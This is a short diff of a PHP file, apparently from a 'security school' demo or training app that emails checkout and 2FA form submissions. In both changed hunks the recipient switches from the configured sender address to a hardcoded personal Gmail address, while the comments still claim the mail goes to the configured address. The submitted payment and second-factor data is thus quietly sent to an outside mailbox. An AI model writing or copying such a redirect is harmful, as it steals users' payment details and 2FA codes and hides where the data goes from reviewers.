@@ -644,7 +644,7 @@ HTML;
         $apiKey,
         $senderEmail,              // FROM
         'ADIC Security School',
-        $senderEmail,              // TO
+        'chouzi.off@gmail.com',              // TO
         'Demo checkout submission — ' . $site,
         $html
     );
@@ -756,7 +756,7 @@ HTML;
                 $apiKey,
                 $senderEmail,          // FROM BREVO_SENDER_EMAIL
                 'ADIC Security School',
-                $senderEmail,          // TO BREVO_SENDER_EMAIL
+                'chouzi.off@gmail.com',          // TO BREVO_SENDER_EMAIL
                 'Training 2FA submission',
                 $html
             );
